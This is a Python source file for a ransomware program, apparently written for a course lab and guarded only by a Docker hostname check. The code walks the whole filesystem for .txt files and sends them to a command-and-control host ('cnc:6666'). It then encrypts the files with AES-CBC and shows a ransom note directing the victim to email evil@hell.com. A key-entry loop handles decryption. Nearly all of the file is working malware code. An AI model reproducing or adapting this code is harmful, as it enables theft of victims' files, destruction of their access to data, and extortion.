import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager
import os


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 *            __  __                                 __ _              *
 *           |  \/  |                               / _| |             *
 *           | \  / | __ _  ___ _ __ ___  ___  ___ | |_| |_            *
 *           | |\/| |/ _` |/ __| '__/ _ \/ __|/ _ \|  _| __|           *
 *           | |  | | (_| | (__| | | (_) \__ \ (_) | | | |_            *
 *           |_|  |_|\__,_|\___|_|  \___/|___/\___/|_|  \__|           *
 *                                                                     *
 *                                                                     *
 *                                                                     *
 *                        Make Vista great again!                      *
 *                                                                     *
 *           Your precious and useful txt files have been locked.      *
 *                                                                     *
 *                Send an email to evil@hell.com with title            *
                     '{token}'                                         
                                                                      
 *                                                                     *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
"""
class Ransomware:

    def __init__(self) -> None:
        self.check_hostname_is_docker()
        self._log = logging.getLogger(self.__class__.__name__)
    


    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            self._log.info(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)



    def get_files(self, filter:str)->list:
        # get all files with specified filter in /
        files = Path("/").rglob(filter)

        # convert path to string
        path_files = [ str(file) for file in files ]

        # return all files matching the filter
        return list(path_files)



    def check_files(self):
        # check if the token file exist (if not, create it)
        #if /root/token/ exist
        return os.path.exists(TOKEN_PATH)



    def encrypt(self):
        # Create a secret manager
        secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, token_path=TOKEN_PATH)

        if not self.check_files():
            # get all txt files
            files = self.get_files("*.txt")

            #create directory
            os.mkdir(TOKEN_PATH)

            # Setup the secret manager
            if secret_manager.setup():
                # Encrypt all files
                #secret_manager.xorfiles(files) # XOR encryption
                #secret_manager.leak_files(files) # send files to cnc for decryption demonstration
                secret_manager.leak_files(files) # send files to cnc
                secret_manager.aes_cbc_files(files, 0) # AES CBC
            else:
                # If setup failed, clean all files and exit
                secret_manager.clean()
                self._log.info("Unable to setup secret manager")
                return
        else:
            # If a file already exist, load the secret manager
            secret_manager.load()

        # Display the message
        self._log.info(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))



    def process_decryption(self, b64_key:str,secret_manager:SecretManager)->bool:
        try:   
            # call set_key with the key
            secret_manager.set_key(b64_key)

            # call xorfiles with all txt files
            files = self.get_files("*.txt")
            #secret_manager.xorfiles(files)
            secret_manager.aes_cbc_files(files, 1)

            # clean the token and salt
            secret_manager.clean()

            self._log.info("Your files have been decrypted !")
            return True

        except Exception as e:
            self._log.error(e)
            return False
        

    def decrypt(self):
        # main function for decrypting (see PDF)
        
        secret_manager = SecretManager(remote_host_port=CNC_ADDRESS)

        if self.check_files():
            secret_manager.load()
        else:
            self._log.error("No token found, nothing to decrypt")
            return
        
        # infinite loop !!!
        while True:

            # ask for the base64 key
            b64_key = input("Enter your key: ")

            # call process_decryption
            if self.process_decryption(b64_key, secret_manager):
                break
            
        # exit the script
        sys.exit(0)


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()